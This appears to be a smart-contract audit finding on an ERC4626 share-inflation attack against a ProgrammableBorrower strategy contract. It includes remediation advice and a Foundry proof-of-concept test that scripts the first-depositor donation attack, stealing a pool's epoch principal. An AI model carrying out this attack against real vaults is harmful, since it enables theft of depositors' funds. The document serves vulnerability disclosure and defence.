### Title
Unvalidated ERC4626 share issuance lets a vault depositor steal epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts an ERC4626 vault based only on its asset address and deposits the entire epoch balance without requiring a minimum number of shares or checking the post-deposit position value. [1](#0-0) [2](#0-1) [3](#0-2) 

If the configured vault is empty or has a very small share supply and rounds share issuance down, an attacker can first deposit one wei of the underlying, donate an amount larger than the pool deposit, and cause `ProgrammableBorrower` to receive zero shares for its deposit. [4](#0-3) 

The attacker then redeems the only vault share and receives both the donation and the pool principal. [5](#0-4) 

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers the pool’s available underlying to the configured programmable borrower and invokes `onStartEpoch`. [6](#0-5) 

`onStartEpoch` records the pre-deposit cash plus existing vault value as `epochStartVaultAssets`, then calls `_depositToVault` for the full on-hand balance. [7](#0-6) 

`_depositToVault` ignores the economic value of the returned shares, while later accounting prices the position through `vault.convertToAssets(vault.balanceOf(address(this)))`. [3](#0-2) [4](#0-3) 

Consequently, a first-depositor/share-inflation attack can leave `ProgrammableBorrower` with zero vault shares after depositing the pool’s principal. [2](#0-1) 

The resulting vault loss is only reflected in `totalInterestDueNow`, which floors net interest at zero; a normal minted-interest stop can therefore succeed without realizing the principal loss in tranche accounting. [8](#0-7) [9](#0-8) 

The pool can remain nominally solvent until withdrawals or pool closure require the missing cash, at which point borrower funding fails and the pool enters default. [10](#0-9) [11](#0-10) 

### Impact Explanation
For a pool deposit of `P`, the attacker deposits one wei into an empty vulnerable vault, receives one share, and donates `D >= P` underlying. [2](#0-1) 

With a vault that calculates shares as `assets * totalSupply / totalAssets`, `ProgrammableBorrower` receives `P / (D + 1)`, which rounds to zero when `D >= P`. [4](#0-3) 

The attacker’s single share is then the entire supply, so redeeming it returns `D + P + 1`; after paying `D + 1`, the attacker’s net profit is the full pool deposit `P`. [4](#0-3) 

This is direct theft of deposited principal followed by unrecorded pool insolvency. [12](#0-11) 

### Likelihood Explanation
The exploit requires the configured ERC4626 vault to have an empty or economically small share supply and share-minting arithmetic that can round the borrower’s deposit to zero or an uneconomically small amount. [1](#0-0) 

Neither `initialize` nor `setVault` enforces minimum vault supply, protected share decimals, dead shares, or a minimum acceptable share output. [13](#0-12) [1](#0-0) 

The attacker only needs to be an ordinary vault depositor and direct token sender; no owner, manager, borrower, or other privileged action is malicious. [3](#0-2) 

A mature ERC4626 vault with substantial supply or virtual-share inflation protection can prevent the practical attack, but the contract accepts vaults without that property. [1](#0-0) 

### Recommendation
Require a minimum share output for every vault deposit and compare the post-deposit `convertToAssets` value with the deposited principal, reverting when the shortfall exceeds a tightly bounded rounding tolerance. [3](#0-2) [4](#0-3) 

Also restrict accepted vaults to implementations with protected share decimals or permanently seeded dead liquidity, and consider requiring a nonzero minimum `totalSupply` during `initialize` and `setVault`. [13](#0-12) [1](#0-0) 

Finally, a material post-deposit vault loss should trigger the existing loss/default path rather than allow a successful epoch stop that preserves the stale strategy-token NAV. [5](#0-4) [14](#0-13) 

### Proof of Concept
The following Foundry fork test deploys an ERC4626-compatible vault with vulnerable floor rounding after the existing mainnet-fork setup, then points the honest owner to that vault through the supported `setVault` path.

// Add to test/foundry/ProgrammableBorrowerCreditVault.t.sol
contract InflationVault is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(address asset_) ERC20("Inflation Vault", "iV") {
    assetToken = IERC20Detailed(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 totalAssets = assetToken.balanceOf(address(this));
    shares = assets * supply / totalAssets;
    if (shares * totalAssets < assets * supply) shares += 1;
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

function testVaultInflationStealsEpochDeposit() external {
  uint256 amount = 10_000 * oneScale;
  address attacker = makeAddr("vaultAttacker");

  // Honest owner/manager selects a valid-asset but empty and inflation-vulnerable ERC4626.
  InflationVault inflationVault = new InflationVault(USDC);
  vm.prank(owner);
  programmableBorrower.setVault(address(inflationVault));

  // Attacker becomes the first vault depositor and donates enough to make
  // amount * 1 / (amount + 1) round down to zero for the pool deposit.
  deal(USDC, attacker, amount + 1, true);
  vm.startPrank(attacker);
  underlying.approve(address(inflationVault), 1);
  uint256 attackerShares = inflationVault.deposit(1, attacker);
  underlying.transfer(address(inflationVault), amount);
  vm.stopPrank();

  assertEq(attackerShares, 1);
  assertEq(inflationVault.totalSupply(), 1);

  // Ordinary CDO deposit and honest epoch start.
  idleCDO.depositAA(amount);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  // ProgrammableBorrower deposited `amount` but received no vault shares.
  assertEq(inflationVault.balanceOf(address(programmableBorrower)), 0);
  assertEq(programmableBorrower.totalUnderlying(), 0);

  // The attacker redeems the only share and receives donation + seed + pool principal.
  vm.prank(attacker);
  uint256 redeemed = inflationVault.redeem(1, attacker, attacker);

  assertEq(redeemed, 2 * amount + 1);
  assertEq(underlying.balanceOf(attacker), 2 * amount + 1);
  // Net attacker profit is `amount`: the entire first epoch deposit.

  // A normal programmable stop succeeds with zero minted interest and does not
  // crystallize the missing principal.
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  assertFalse(cdoEpoch.defaulted());
  assertGt(cdoEpoch.virtualPrice(address(aaTranche)), 0);
  assertEq(programmableBorrower.totalUnderlying(), 0);

  // A withdrawal request can still be opened against the stale NAV.
  cdoEpoch.requestWithdraw(0, address(aaTranche));

  // The next stop must source the pending receipt and discovers the missing funds.
  vm.warp(block.timestamp + cdoEpoch.bufferPeriod() + 1);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  assertTrue(cdoEpoch.defaulted());
}
